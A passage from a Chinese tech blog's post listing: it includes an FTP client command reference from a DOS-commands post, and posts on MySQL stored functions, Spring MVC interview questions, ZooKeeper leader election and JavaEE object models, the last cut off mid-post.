用Telnet连接完对方后，就用这个命令将对方的Telnet设置还原，并同时关闭Telnet服务。<br>6、FTP命令详解：<br>FTP命令是Internet用户使用最频繁的命令之一，熟悉并灵活应用FTP的内部命令，可以大大方便使用者，并收到事半功倍之效。如果你想学习使用进行后台FTP下载，那么就必须学习FTP指令。<br>FTP的命令行格式为：<br>ftp -v -d -i -n -g [主机名] ，其中<br>-v 显示远程服务器的所有响应信息；<br>-n 限制ftp的自动登录，即不使用；.n etrc文件；<br>-d 使用调试方式；<br>-g 取消全局文件名。</p>
<p>FTP使用的内部命令如下(中括号表示可选项):<br>1.![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如：!ls<em>.zip<br>2.$ macro-ame[args]： 执行宏定义macro-name。<br>3.account[password]： 提供登录远程系统成功后访问系统资源所需的补充口令。<br>4.append local-file[remote-file]：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。<br>5.ascii：使用ascii类型传输方式。<br>6.bell：每个命令执行完毕后计算机响铃一次。<br>7.bin：使用二进制文件传输方式。<br>8.bye：退出ftp会话过程。<br>9.case：在使用mget时，将远程主机文件名中的大写转为小写字母。<br>10.cd remote-dir：进入远程主机目录。<br>11.cdup：进入远程主机目录的父目录。<br>12.chmod mode file-name：将远程主机文件file-name的存取方式设置为mode，如：chmod 777 a.out。<br>13.close：中断与远程服务器的ftp会话(与open对应)。<br>14.cr：使用asscii方式传输文件时，将回车换行转换为回行。<br>15.delete remote-file：删除远程主机文件。<br>16.debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命令，如：deb up 3，若设为0，表示取消debug。<br>17.dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本地文件。<br>18.disconnection：同close。<br>19.form format：将文件传输方式设置为format，缺省为file方式。<br>20.get remote-file[local-file]： 将远程主机的文件remote-file传至本地硬盘的local-file。<br>21.glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名，同命令行的-g参数。<br>22.hash：每传输1024字节，显示一个hash符号(#)。<br>23.help[cmd]：显示ftp内部命令cmd的帮助信息，如：help get24.idle[seconds]：将远程服务器的休眠计时器设为[seconds]秒。<br>25.image：设置二进制传输方式(同binary)。<br>26.lcd[dir]：将本地工作目录切换至dir。<br>27.ls[remote-dir][local-file]：显示远程目录remote-dir， 并存入本地文件local-file。<br>28.macdef macro-name：定义一个宏，遇到macdef下的空行时，宏定义结束。<br>29.mdelete[remote-file]：删除远程主机文件。<br>30.mdir remote-files local-file：与dir类似，但可指定多个远程文件，如 ：mdir </em>.o.*.zipoutfile 。<br>31.mget remote-files：传输多个远程文件。<br>32.mkdir dir-name：在远程主机中建一目录。<br>33.mls remote-file local-file：同nlist，但可指定多个文件名。<br>34.mode[modename]：将文件传输方式设置为modename， 缺省为stream方式。<br>35.modtime file-name：显示远程主机文件的最后修改时间。<br>36.mput local-file：将多个文件传输至远程主机。<br>37.newer file-name： 如果远程机中file-name的修改时间比本地硬盘同名文件的时间更近，则重传该文件。<br>38.nlist[remote-dir][local-file]：显示远程主机目录的文件清单，并存入本地硬盘的local-file。<br>39.nmap[inpattern outpattern]：设置文件名映射机制， 使得文件传输时，文件中的某些字符相互转换， 如：nmap $1.$2.$3[$1，$2].[$2，$3]，则传输文件a1.a2.a3时，文件名变为a1，a2。 该命令特别适用于远程主机为非UNIX机的情况。<br>40.ntrans[inchars[outchars]]：设置文件名字符的翻译机制，如ntrans1R，则文件名LLL将变为RRR。<br>41.open host[port]：建立指定ftp服务器连接，可指定连接端口。<br>42.passive：进入被动传输方式。<br>43.prompt：设置多个文件传输时的交互提示。<br>44.proxy ftp-cmd：在次要控制连接中，执行一条ftp命令， 该命令允许连接两个ftp服务器，以在两个服务器间传输文件。第一条ftp命令必须为open，以首先建立两个服务器间的连接。<br>45.put local-file[remote-file]：将本地文件local-file传送至远程主机。<br>46.pwd：显示远程主机的当前工作目录。<br>47.quit：同bye，退出ftp会话。<br>48.quote arg1，arg2…：将参数逐字发至远程ftp服务器，如：quote syst.<br>49.recv remote-file[local-file]：同get。<br>50.reget remote-file[local-file]：类似于get， 但若local-file存在，则从上次传输中断处续传。<br>51.rhelp[cmd-name]：请求获得远程主机的帮助。<br>52.rstatus[file-name]：若未指定文件名，则显示远程主机的状态， 否则显示文件状态。<br>53.rename[from][to]：更改远程主机文件名。<br>54.reset：清除回答队列。<br>55.restart marker：从指定的标志marker处，重新开始get或put，如：restart 130。<br>56.rmdir dir-name：删除远程主机目录。<br>57.runique：设置文件名只一性存储，若文件存在，则在原文件后加后缀.1， .2等。<br>58.send local-file[remote-file]：同put。<br>59.sendport：设置PORT命令的使用。<br>60.site arg1，arg2…：将参数作为SITE命令逐字发送至远程ftp主机。<br>61.size file-name：显示远程主机文件大小，如：site idle 7200。<br>62.status：显示当前ftp状态。<br>63.struct[struct-name]：将文件传输结构设置为struct-name， 缺省时使用stream结构。<br>64.sunique：将远程主机文件名存储设置为只一(与runique对应)。<br>65.system：显示远程主机的操作系统类型。<br>66.tenex：将文件传输类型设置为TENEX机的所需的类型。<br>67.tick：设置传输时的字节计数器。<br>68.trace：设置包跟踪。<br>69.type[type-name]：设置文件传输类型为type-name，缺省为ascii，如:type binary，设置二进制传输方式。<br>70.umask[newmask]：将远程服务器的缺省umask设置为newmask，如：umask 3<br>71.user user-name[password][account]：向远程主机表明自己的身份，需要口令时，必须输入口令，如：user anonymous my@email。<br>72.verbose：同命令行的-v参数，即设置详尽报告方式，ftp 服务器的所有响 应都将显示给用户，缺省为on.<br>73.?[cmd]：同help.   </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/12/29/DOS命令大全/" data-id="cjebf17c20009203tfkpzhmol" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Shell/">Shell</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-MySql存储函数入门教程" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/12/19/MySql存储函数入门教程/" class="article-date">
  <time datetime="2017-12-19T05:45:37.000Z" itemprop="datePublished">2017-12-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/12/19/MySql存储函数入门教程/">MySql存储函数入门教程</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>[TOC]</p>
<h4 id="什么是存储函数"><a href="#什么是存储函数" class="headerlink" title="什么是存储函数"></a>什么是存储函数</h4><p>存储函数和存储过程相似，都是用一个事务进行管理的多条SQL语句的集合。</p>
<h4 id="存储函数的定义"><a href="#存储函数的定义" class="headerlink" title="存储函数的定义"></a>存储函数的定义</h4><pre><code>DROP FUNCTION IF EXISTS funName; -- 便于修改存储函数，非必须
CREATE FUNCTION funName(param 参数类型)
  RETURNS 返回值类型
  BEGIN
    RETURN 1; -- 返回值
  END;
</code></pre><h4 id="存储函数的调用"><a href="#存储函数的调用" class="headerlink" title="存储函数的调用"></a>存储函数的调用</h4><pre><code>-- 直接调用 SELECT 存储函数名(参数)
SELECT fun(&quot;param&quot;)

-- 作为查询条件调用
SELECT * FROM user WHERE id = findId(&quot;param&quot;)
</code></pre><h4 id="存储过程中的语法"><a href="#存储过程中的语法" class="headerlink" title="存储过程中的语法"></a>存储过程中的语法</h4><ul>
<li>流控制（Flow-of-control）语句(IF，CASE，WHILE，LOOP，WHILE，REPEAT，LEAVE，ITERATE)也是合法的。</li>
<li>变量声明(DECLARE)以及指派(SET)是合法的. </li>
<li>允许条件声明. </li>
<li>异常处理声明也是允许的. </li>
<li><p>但是在这里要记住函数有受限条件:不能在函数中访问表</p>
<h4 id="存储函数与存储过程的区别"><a href="#存储函数与存储过程的区别" class="headerlink" title="存储函数与存储过程的区别"></a>存储函数与存储过程的区别</h4></li>
<li><p>存储函数有且只有一个返回值，而存储过程不能有返回值；</p>
</li>
<li>函数只能有输入参数，而且不能带in, 而存储过程可以有多个in,out,inout参数；</li>
<li>存储过程中的语句功能更强大，存储过程可以实现很复杂的业务逻辑，而函数有很多限制，如不能在函数中使用insert,update,delete,create等语句；存储函数只完成查询的工作，可接受输入参数并返回一个结果，也就是函数实现的功能针对性比较强；</li>
<li>存储过程可以调用存储函数。但函数不能调用存储过程；</li>
<li>存储过程一般是作为一个独立的部分来执行(call调用)。而函数可以作为查询语句的一个部分来调用。</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/12/19/MySql存储函数入门教程/" data-id="cjebf17dz001c203turjgoqqo" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/MySql/">MySql</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Springmvc面试总结" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/12/11/Springmvc面试总结/" class="article-date">
  <time datetime="2017-12-11T15:59:49.000Z" itemprop="datePublished">2017-12-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/12/11/Springmvc面试总结/">Springmvc面试总结</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="什么是Springmvc"><a href="#什么是Springmvc" class="headerlink" title="什么是Springmvc"></a>什么是Springmvc</h4><p>&emsp;&emsp;Springmvc是表现层(web层)的一个MVC框架,是Spring的一部分</p>
<h4 id="Springmvc在B-S中的架构图"><a href="#Springmvc在B-S中的架构图" class="headerlink" title="Springmvc在B/S中的架构图"></a>Springmvc在B/S中的架构图</h4><p><img src="Springmvc面试总结/1.png" alt="Springmvc"></p>
<h4 id="Springmvc的架构图"><a href="#Springmvc的架构图" class="headerlink" title="Springmvc的架构图"></a>Springmvc的架构图</h4><p><img src="Springmvc面试总结/2.png" alt="Springmvc"><br><img src="Springmvc面试总结/3.png" alt="Springmvc"></p>
<h4 id="Springmvc怎么处理返回值"><a href="#Springmvc怎么处理返回值" class="headerlink" title="Springmvc怎么处理返回值"></a>Springmvc怎么处理返回值</h4><p>&emsp;&emsp;封装为ModelAndView或者直接返回字符串</p>
<h4 id="Springmvc-Struts2-Strruts1的入口分别是什么"><a href="#Springmvc-Struts2-Strruts1的入口分别是什么" class="headerlink" title="Springmvc,Struts2,Strruts1的入口分别是什么"></a>Springmvc,Struts2,Strruts1的入口分别是什么</h4><p>&emsp;&emsp;Springmvc是DispatcherServlet,Struts2是strutsPrepareAndExcutFilter,Struts1是ActionServlet</p>
<h4 id="Struts2与Springmvc的区别"><a href="#Struts2与Springmvc的区别" class="headerlink" title="Struts2与Springmvc的区别"></a>Struts2与Springmvc的区别</h4><p>&emsp;&emsp;1.Struts2前端控制器是一个Filter,Springmvc的前端控制器是一个Servlet<br>&emsp;&emsp;2.Struts2用成员变量接收参数,所以是多例模式的,Springmvc用形式参数进行参数绑定,所以是单利的<br>&emsp;&emsp;3.Struts2存取值是通过值栈和OGNL表达式,Springmvc是进行参数绑定<br>&emsp;&emsp;4.Struts2是基于类进行开发的,Springmvc是基于方法进行开发的</p>
<h4 id="前端框架有了Struts2为什么还需要Springmvc"><a href="#前端框架有了Struts2为什么还需要Springmvc" class="headerlink" title="前端框架有了Struts2为什么还需要Springmvc"></a>前端框架有了Struts2为什么还需要Springmvc</h4><p>&emsp;&emsp;1.从运行效率上来讲,Struts2和Springmvc是没有多大差异的,只是Springmvc比Struts2开发效率要高<br>&emsp;&emsp;2.struts2在开发的历程中暴露出来了一些安全性的问题<br>&emsp;&emsp;3.struts2和springmvc并没有什么相对的概念,就好比有了百事可乐,可口可乐也依然存在一样,两者并不矛盾</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/12/11/Springmvc面试总结/" data-id="cjebf17eu0023203t9sc0apnp" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Springmvc/">Springmvc</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Zookeeper的领导者选举和原子广播" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/11/30/Zookeeper的领导者选举和原子广播/" class="article-date">
  <time datetime="2017-11-30T09:04:35.000Z" itemprop="datePublished">2017-11-30</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/11/30/Zookeeper的领导者选举和原子广播/">Zookeeper的领导者选举和原子广播</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><strong>目录：</strong></p>
<ol>
<li>工作原理概述</li>
<li>Fast Leader选举算法（领导者选举）</li>
<li>Leader与Follower同步数据（原子广播）</li>
</ol>
<hr>
<h4 id="工作原理概述"><a href="#工作原理概述" class="headerlink" title="工作原理概述"></a>工作原理概述</h4><p>zookeeper3.3.3源码分析(一)工作原理概述<br>阅读时参考的版本是3.3.3.</p>
<p>&emsp;&emsp;简单的说一下zookeeper工作的过程,如果对这个过程还不太清楚,或者说对它如何使用等不太清楚的,可以参考一下其他的文章,比如这篇,这一系列的文章将不讲解它如何使用(实际上我也没有在具体项目中使用过,只是简单的配置运行起来大概晓得如何工作而已).</p>
<p>&emsp;&emsp;zookeeper有两种工作的模式,一种是单机方式,另一种是集群方式.单机方式不属于这里分析的范畴,因为研究zookeeper的目的就在于研究一个zookeeper集群的机器如何协调起来工作的.</p>
<p>&emsp;&emsp;要配置几台zookeeper一起工作,大家在开始必须使用相同的配置文件,配置文件中有一些配置项,但是与集群相关的是这一项:</p>
<p>server.1=192.168.211.1:2888:3888<br>server.2=192.168.211.2:2888:3888</p>
<p>这里定义了两台服务器的配置,格式为:</p>
<p>server.serverid=serverhost:leader_listent_port:quorum_port</p>
<p>&emsp;&emsp;顾名思义,serverid是本服务器的id,leader_listen_port是该服务器一旦成为leader之后需要监听的端口,用于接收来自follower的请求,quorum_port是集群中的每一个服务器在最开始选举leader时监听的端口,用于服务器互相之间通信选举leader.</p>
<p>&emsp;&emsp;需要注意的是,server id并没有写在这个配置文件中,而是在datadir中的myid文件中指定,我理解这么做的目的是:所有的服务器统一使用一个配置文件,该配置文件里面没有任何与特定服务器相关的信息,这样便于发布服务的时候不会出错,而独立出来一个文件专门存放这个server id值.</p>
<p>zookeeper集群工作的过程包括如下几步:<br>1) recovery,这个过程泛指集群服务器的启动和恢复,因为恢复也可以理解为另一种层面上的”启动”–需要恢复历史数据的启动,后面会详细讲解.<br>2) broadcast,这是启动完毕之后,集群中的服务器开始接收客户端的连接一起工作的过程,如果客户端有修改数据的改动,那么一定会由leader广播给follower,所以称为”broadcast”.</p>
<p>展开来说,zookeeper集群大概是这样工作的:<br>&emsp;&emsp;1) 首先每个服务器读取配置文件和数据文件,根据serverid知道本机对应的配置(就是前面那些地址和端口),并且将历史数据加载进内存中.<br>&emsp;&emsp;2) 集群中的服务器开始根据前面给出的quorum port监听集群中其他服务器的请求,并且把自己选举的leader也通知其他服务器,来来往往几回,选举出集群的一个leader.<br>&emsp;&emsp;3) 选举完leader其实还不算是真正意义上的”leader”,因为到了这里leader还需要与集群中的其他服务器同步数据,如果这一步出错,将返回2)中重新选举leader.在leader选举完毕之后,集群中的其他服务器称为”follower”,也就是都要听从leader的指令.<br>&emsp;&emsp;4) 到了这里,集群中的所有服务器,不论是leader还是follower,大家的数据都是一致的了,可以开始接收客户端的连接了.如果是读类型的请求,那么直接返回就是了,因为并不改变数据;否则,都要向leader汇报,如何通知leader呢?就是通过前面讲到的leader_listen_port.leader收到这个修改数据的请求之后,将会广播给集群中其他follower,当超过一半数量的follower有了回复,那么就相当于这个修改操作哦了,这时leader可以告诉之前的那台服务器可以给客户端一个回应了.</p>
<p>可以看到,上面1),2),3)对应的recovery过程,而4)对应的broadcast过程.这里只是简单的描述了一下zookeeper集群的工作原理,后面将分别展开来讨论.</p>
<h4 id="Fast-Leader选举算法（领导者选举）"><a href="#Fast-Leader选举算法（领导者选举）" class="headerlink" title="Fast Leader选举算法（领导者选举）"></a>Fast Leader选举算法（领导者选举）</h4><p>&emsp;&emsp;如何在zookeeper集群中选举出一个leader,zookeeper使用了三种算法,具体使用哪种算法,在配置文件中是可以配置的,对应的配置项是”electionAlg”,其中1对应的是LeaderElection算法,2对应的是AuthFastLeaderElection算法,3对应的是FastLeaderElection算法.默认使用FastLeaderElection算法.其他两种算法我没有研究过,就不多说了.</p>
<p>要理解这个算法,最好需要一些paxos算法的理论基础.</p>
<p>1) 数据恢复阶段<br>首先,每个在zookeeper服务器先读取当前保存在磁盘的数据,zookeeper中的每份数据,都有一个对应的id值,这个值是依次递增的,换言之,越新的数据,对应的ID值就越大.</p>
<p>2) 向其他节点发送投票值<br>在读取数据完毕之后,每个zookeeper服务器发送自己选举的leader（首次选自己）,这个协议中包含了以下几部分的数据:</p>
<pre><code>a)所选举leader的id(就是配置文件中写好的每个服务器的id) ,在初始阶段,每台服务器的这个值都是自己服务器的id,也就是它们都选举自己为leader.
b) 服务器最大数据的id,这个值大的服务器,说明存放了更新的数据.
c)逻辑时钟的值,这个值从0开始递增,每次选举对应一个值,也就是说:  如果在同一次选举中,那么这个值应该是一致的 ;  逻辑时钟值越大,说明这一次选举leader的进程更新.
d) 本机在当前选举过程中的状态,有以下几种:LOOKING,FOLLOWING,OBSERVING,LEADING,顾名思义不必解释了吧.
</code></pre><p>3）接受来自其他节点的数据<br>&emsp;&emsp;每台服务器将自己服务器的以上数据发送到集群中的其他服务器之后,同样的也需要接收来自其他服务器的数据,它将做以下的处理:<br>（1）如果所接收数据中服务器的状态还是在选举阶段(LOOKING 状态),那么首先判断逻辑时钟值,又分为以下三种情况:</p>
<pre><code> a) 如果发送过来的逻辑时钟大于目前的逻辑时钟,那么说明这是更新的一次选举,此时需要更新一下本机的逻辑时钟值,同时将之前收集到的来自其他服务器的选举清空,因为这些数据已经不再有效了.然后判断是否需要更新当前自己的选举情况.在这里是根据选举leader id,保存的最大数据id来进行判断的,这两种数据之间对这个选举结果的影响的权重关系是:首先看数据id,数据id大者胜出;其次再判断leader id,leader id大者胜出.然后再将自身最新的选举结果(也就是上面提到的三种数据）广播给其他服务器).
b) 发送过来数据的逻辑时钟小于本机的逻辑时钟，说明对方在一个相对较早的选举进程中,这里只需要将本机的数据发送过去就是了
c) 两边的逻辑时钟相同,此时也只是调用totalOrderPredicate函数判断是否需要更新本机的数据,如果更新了再将自己最新的选举结果广播出去就是了.
</code></pre><p>然后再处理两种情况:<br>&emsp;&emsp;1)服务器判断是不是已经收集到了所有服务器的选举状态,如果是，那么这台服务器选举的leader就定下来了，然后根据选举结果设置自己的角色(FOLLOWING还是LEADER),然后退出选举过程就是了.<br>&emsp;&emsp;2)即使没有收集到所有服务器的选举状态,也可以根据该节点上选择的最新的leader是不是得到了超过半数以上服务器的支持,如果是,那么当前线程将被阻塞等待一段时间(这个时间在finalizeWait定义)看看是不是还会收到当前leader的数据更优的leader,如果经过一段时间还没有这个新的leader提出来，那么这台服务器最终的leader就确定了,否则进行下一次选举. </p>
<p>（2) 如果所接收服务器不在选举状态,也就是在FOLLOWING或者LEADING状态</p>
<p>做以下两个判断:<br>&emsp;&emsp;a) 如果逻辑时钟相同,将该数据保存到recvset,如果所接收服务器宣称自己是leader,那么将判断是不是有半数以上的服务器选举它,如果是则设置选举状态退出选举过程<br>&emsp;&emsp;b) 否则这是一条与当前逻辑时钟不符合的消息,那么说明在另一个选举过程中已经有了选举结果,于是将该选举结果加入到outofelection集合中,再根据outofelection来判断是否可以结束选举,如果可以也是保存逻辑时钟,设置选举状态,退出选举过程.<br>代码如下:</p>
<p>以一个简单的例子来说明整个选举的过程.<br>假设有五台服务器组成的zookeeper集群,它们的id从1-5,同时它们都是最新启动的,也就是没有历史数据,在存放数据量这一点上,都是一样的.假设这些服务器依序启动,来看看会发生什么.<br>&emsp;&emsp;1) 服务器1启动,此时只有它一台服务器启动了,它发出去的报没有任何响应,所以它的选举状态一直是LOOKING状态<br>&emsp;&emsp;2) 服务器2启动,它与最开始启动的服务器1进行通信,互相交换自己的选举结果,由于两者都没有历史数据,所以id值较大的服务器2胜出,但是由于没有达到超过半数以上的服务器都同意选举它(这个例子中的半数以上是3),所以服务器1,2还是继续保持LOOKING状态.<br>&emsp;&emsp;3) 服务器3启动,根据前面的理论分析,服务器3成为服务器1,2,3中的老大,而与上面不同的是,此时有三台服务器选举了它,所以它成为了这次选举的leader.<br>&emsp;&emsp;4) 服务器4启动,根据前面的分析,理论上服务器4应该是服务器1,2,3,4中最大的,但是由于前面已经有半数以上的服务器选举了服务器3,所以它只能接收当小弟的命了.<br>&emsp;&emsp;5) 服务器5启动,同4一样,当小弟.</p>
<p>&emsp;&emsp;以上就是fastleader算法的简要分析,还有一些异常情况的处理,比如某台服务器宕机之后的处理,当leader宕机之后的处理等等,后面再谈.</p>
<h4 id="Leader与Follower同步数据（原子广播）"><a href="#Leader与Follower同步数据（原子广播）" class="headerlink" title="Leader与Follower同步数据（原子广播）"></a>Leader与Follower同步数据（原子广播）</h4><p>&emsp;&emsp;根据 Fast Leader选举算法中的分析,如果一台zookeeper服务器成为集群中的leader,那么一定是当前所有服务器中保存数据最多（不是最新？？）的服务器,所以在这台服务器成为leader之后,首先要做的事情就是与集群中的其它服务器(现在是follower)同步数据,保证大家的数据一致,这个过程完毕了才开始正式处理来自客户端的连接请求.</p>
<p>&emsp;&emsp;Fast Leader选举算法中提到的同步数据时使用的逻辑时钟,它的初始值是0,每次选举过程都会递增的,在leader正式上任之后做的第一件事情,就是根据当前保存的数据id值,设置最新的逻辑时钟值。</p>
<p>&emsp;&emsp;随后,leader构建NEWLEADER封包,该封包的数据是当前最大数据的id,广播给所有的follower,也就是告知follower leader保存的数据id是多少,大家看看是不是需要同步。然后,leader根据follower数量给每个follower创建一个线程LearnerHandler,专门负责接收它们的同步数据请求.leader主线程开始阻塞在这里,等待其他follower的回应(也就是LearnerHandler线程的处理结果),同样的,只有在超过半数的follower已经同步数据完毕,这个过程才能结束,leader才能正式成为leader.</p>
<p><strong>leader所做的工作：</strong></p>
<p>&emsp;&emsp;所以其实leader与follower同步数据的大部分操作都在LearnerHandler线程中处理的,接着看这一块.<br>leader接收到的来自某个follower封包一定是FOLLOWERINFO,该封包告知了该服务器保存的数据id.之后根据这个数据id与本机保存的数据进行比较:<br>&emsp;&emsp;1) 如果数据完全一致,则发送DIFF封包告知follower当前数据就是最新的了.<br>&emsp;&emsp;2) 判断这一阶段之内有没有已经被提交的提议值,如果有,那么:<br>&emsp;&emsp;&emsp;&emsp;a) 如果有部分数据没有同步,那么会发送DIFF封包将有差异的数据同步过去.同时将follower没有的数据逐个发送COMMIT封包给follower要求记录下来.<br>&emsp;&emsp;&emsp;&emsp;b) 如果follower数据id更大,那么会发送TRUNC封包告知截除多余数据.（一台leader数据没同步就宕掉了，选举之后恢复了，数据比现在leader更新）<br>&emsp;&emsp;3) 如果这一阶段内没有提交的提议值,直接发送SNAP封包将快照同步发送给follower.<br>&emsp;&emsp;4）消息完毕之后,发送UPTODATE封包告知follower当前数据就是最新的了,再次发送NEWLEADER封包宣称自己是leader,等待follower的响应.</p>
<p><strong>follower做的工作：</strong><br>（1）会尝试与leader建立连接,这里有一个机制,如果一定时间内没有连接上,就报错退出,重新回到选举状态.<br>（2）其次在发送FOLLOWERINFO封包,该封包中带上自己的最大数据id,也就是会告知leader本机保存的最大数据id.<br>（3）根据前面对LeaderHandler的分析,leader会根据不同的情况发送DIFF,UPTODATE,TRUNC,SNAP,依次进行处理就是了,此时follower跟leader的数据也就同步上了.<br>（4）由于leader端发送的最后一个封包是UPTODATE,因此在接收到这个封包之后follower结束同步数据过程,发送ACK封包回复leader.</p>
<p>以上过程中,任何情况出现的错误,服务器将自动将选举状态切换到LOOKING状态,重新开始进行选举.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/11/30/Zookeeper的领导者选举和原子广播/" data-id="cjebf17fc002j203tmxjuj7ii" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Zookeeper/">Zookeeper</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-JavaEE开发中的几种对象模型" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/11/01/JavaEE开发中的几种对象模型/" class="article-date">
  <time datetime="2017-11-01T06:15:10.000Z" itemprop="datePublished">2017-11-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/11/01/JavaEE开发中的几种对象模型/">JavaEE开发中的几种对象模型</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="JavaEE开发中的几种对象模型-PO-VO-DAO-BO-POJO，DTO-解释"><a href="#JavaEE开发中的几种对象模型-PO-VO-DAO-BO-POJO，DTO-解释" class="headerlink" title="JavaEE开发中的几种对象模型(PO,VO,DAO,BO,POJO，DTO)解释"></a>JavaEE开发中的几种对象模型(PO,VO,DAO,BO,POJO，DTO)解释</h4><ol>
<li><strong>PO:</strong> persistant object 持久对象,可以看成是与数据库中的表相映射的java对象。最简单的PO就是对应数据库中某个表中的一条记录，多个记录可以用PO的集合。PO中应该不包含任何对数据库的操作。 </li>
<li><p><strong>VO:</strong> value object值对象。通常用于业务层之间的数据传递，和PO一样也是仅仅包含数据而已。但应是抽象出的业务对象,可以和表对应,也可以不,这根据业务的需要.个人觉得同DTO(数据传输对象),在web上传递。</p>
</li>
<li><p><strong>DAO:</strong> data access object 数据访问对象，是一个sun的一个标准j2ee设计模式 ．此对象用于访问数据库。通常和PO结合使用，DAO中包含了各种数据库的操作方法。通过它的方法,结合PO对数据库进行相关的操作。夹在业务逻辑与数据 库资源中间。配合VO,<br>提供数据库的CRUD操作…</p>
</li>
<li><p><strong>BO</strong>(business object) 业务对象<br>从业务模型的角度看,见UML元件领域模型中的领域对象。封装业务逻辑的java对象,通过调用DAO方法,结合PO,VO进行业务操作。这个对象可以包括一个或多个其它的对象。<br>比如一个简历，有教育经历、工作经历、 关系等等。<br>我们可以把教育经历对应一个PO，工作经历对应一个PO， 关系对应一个PO。<br>建立一个对应简历的BO对象处理简历，每个BO包含这些PO。<br>这样处理业务逻辑时，我们就可以针对BO去处理。<br>(关于BO主要有三种概念 :<br>1 、只包含业务对象的属性；<br>2 、只包含业务方法；<br>3 、两者都包含。<br>在实际使用中，认为哪一种概念正确并不重要，关键是实际应用中适合自己项目的需要)</p>
</li>
<li><p><strong>POJO:</strong> plain ordinary java object 简单无规则java对象,我个人觉得它和其他不是一个层面上的东西,VO和PO应该都属于它。</p>
</li>
<li><p><strong>DTO:</strong> Data Transfer Object（数据传输对象）DTO 是一组需要跨进程或网络边界传输的聚合数据的简单容器。它不应该包含业务逻辑，并将其行为限制为诸如内部一致性检查和基本验证之类的活动。注意，不要因实 现这些方法而导致 DTO 依赖于任何新类。在设计数据传输对象时，您有两种主要选择：使用一般集合；或使用显式的 getter 和 setter 方法创建自定义对象。</p>
</li>
</ol>
<h4 id="对象模型特征"><a href="#对象模型特征" class="headerlink" title="对象模型特征"></a>对象模型特征</h4><p><strong>ORM: </strong>是 Object Relational Mapping（对象关系映射）的缩写。通俗点讲，就是将对象与关系数据库绑定，用对象来表示关系数据。在ROM的世界里，有两个基本的也是重要的东东需要了解，即VO，PO。 </p>
<ol>
<li><p>VO，值对象(Value Object)，PO，持久对象(Persisent Object)，它们是由一组属性和属性的get和set方法组成。从结构上看，它们并没有什么不同的地方。但从其意义和本质上来看是完全不同的。</p>
</li>
<li><p>VO是用new关键字创建，由GC回收的。<br>　　PO则是向数据库中添加新数据时创建，删除数据库中数据时削除的。并且它只能存活在一个数据库连接中，断开连接即被销毁。 </p>
</li>
<li>VO是值对象，精确点讲它是业务对象，是存活在业务层的，是业务逻辑使用的，它存活的目的就是为数据提供一个生存的地方。 </li>
<li>PO则是有状态的，每个属性代表其当前的状态。它是物理数据的对象表示。使用它，可以使我们的程序与物理数据解耦，并且可以简化对象数据与物理数据之间的转换。 </li>
<li><p>VO的属性是根据当前业务的不同而不同的，也就是说，它的每一个属性都一一对应当前业务逻辑所需要的数据的名称。<br>　　PO的属性是跟数据库表的字段一一对应的。PO对象需要实现序列化接口。<br>PO：</p>
<p> persistant object持久对象<br> 最形象的理解就是一个PO就是数据库中的一条记录。<br> 好处是可以把一条记录作为一个对象处理，可以方便的转为其它对象。</p>
</li>
</ol>
<p>BO：</p>
<pre><code>business object业务对象
主要作用是把业务逻辑封装为一个对象。这个对象可以包括一个或多个其它的对象。
比如一个简历，有教育经历、工作经历、  关系等等。
我们可以把教育经历对应一个PO，工作经历对应一个PO，  关系对应一个PO。
建立一个对应简历的BO对象处理简历，每个BO包含这些PO。
这样处理业务逻辑时，我们就可以针对BO去处理。
</code></pre><p>VO ：</p>
<pre><code>value object值对象
ViewObject表现层对象
主要对应界面显示的数据对象。对于一个WEB页面，或者SWT、SWING的一个界面，用一个VO对象对应整个界面的值。
</code></pre><p>DTO ：</p>
<pre><code>Data Transfer Object数据传输对象
主要用于远程调用等需要大量传输对象的地方。
比如我们一张表有100个字段，那么对应的PO就有100个属性。
但是我们界面上只要显示10个字段，
客户端用WEB service来获取数据，没有必要把整个PO对象传递到客户端，
这时我们就可以用只有这10个属性的DTO来传递结果到客户端，这样也不会暴露服务端表结构.到达客户端以后，如果用这个对象来对应界面显示，那此时它的身份就转为VO
</code></pre><p>POJO ：</p>
